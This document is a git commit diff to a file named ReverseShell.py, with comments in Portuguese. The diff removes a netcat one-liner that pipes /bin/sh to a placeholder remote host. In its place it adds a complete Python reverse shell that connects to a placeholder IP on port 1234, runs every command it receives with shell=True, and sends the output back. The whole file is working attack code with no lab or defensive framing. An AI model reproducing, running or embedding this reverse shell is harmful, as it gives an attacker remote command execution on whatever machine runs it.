212fd173189a7d4b58fcdfcc1990c0aeade238ca
JitteryProgrammer <120346064+JitteryProgrammer@users.noreply.github.com>
2022-12-12 03:00:50 -0300

    Update ReverseShell.py

--- ReverseShell.py
+++ ReverseShell.py
@@ -1,6 +1,22 @@
-import subprocess
+import socket,subprocess
 
+#IP e porta para conectar
+HOST = 'IP' 
+PORT = 1234
 
-host = "your.remote.host"
-port = 1234
-subprocess.call(["nc", host, port, "-e", "/bin/sh"])
+#Criando um socket TCP/IP
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+#Conectando ao servidor
+s.connect((HOST, PORT))
+
+#Loop Indefinido
+while True:
+     #Recebendo dados do servidor
+     data = s.recv(1024)
+     #Executando os comandos
+     proc = subprocess.Popen(data, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+     #Lendo saída dos comandos
+     saida = proc.stdout.read() + proc.stderr.read()
+     #Enviando resultado dos comandos
+     s.send(saida)
